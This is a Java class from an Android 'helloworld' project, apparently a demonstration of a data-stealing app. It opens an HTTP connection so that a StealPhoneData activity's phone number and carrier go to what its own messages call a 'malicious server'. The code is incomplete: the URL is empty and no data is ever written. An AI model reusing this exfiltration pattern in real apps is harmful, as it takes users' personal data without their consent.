package com.example.aahewins.helloworld;
import android.content.Context;
import android.util.Log;
import android.widget.Toast;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
/**
 * Sends information to the server.
 * @author Anthony Hewins
 * @version 1.1
 * @since 1.0
 */
public class SendToServer {
    private final static String SITE = "";
    private OutputStream output;
    private URL url;
    private HttpURLConnection connection;
    /**
     * Constructor that sends the parameter string to the server for the attack.
     * @param s Uses c as the object providing data
     */
    public SendToServer(StealPhoneData s) {
        try {
            url = new URL(SITE);
            connection = (HttpURLConnection) url.openConnection();
            output = new BufferedOutputStream(connection.getOutputStream());
            Toast.makeText(s, "Sent phone number and provider\nto malicious server", Toast.LENGTH_LONG).show();
        } catch (MalformedURLException mue) {
            Log.d("MalformedURLException","MalformedURLException: " + this.url);
        } catch (IOException io) {
            Log.d("IOException","IO problem:\n");
            io.printStackTrace();
        } finally {
            connection.disconnect();
            Toast.makeText(s, "Disconnected from server", Toast.LENGTH_SHORT).show();
        }
    }

    public SendToServer(Context c, String s) {
        try {
            url = new URL(SITE);
            connection = (HttpURLConnection) url.openConnection();
            output = new BufferedOutputStream(connection.getOutputStream());
            Toast.makeText(c, "Sent verification text to server: " + s, Toast.LENGTH_LONG).show();
        } catch (MalformedURLException mue) {
            Log.d("MalformedURLException","MalformedURLException: " + this.url);
        } catch (IOException io) {
            Log.d("IOException","IO problem:\n");
            io.printStackTrace();
        } finally {
            connection.disconnect();
            Toast.makeText(c, "Disconnected from server", Toast.LENGTH_SHORT).show();
        }
    }
}
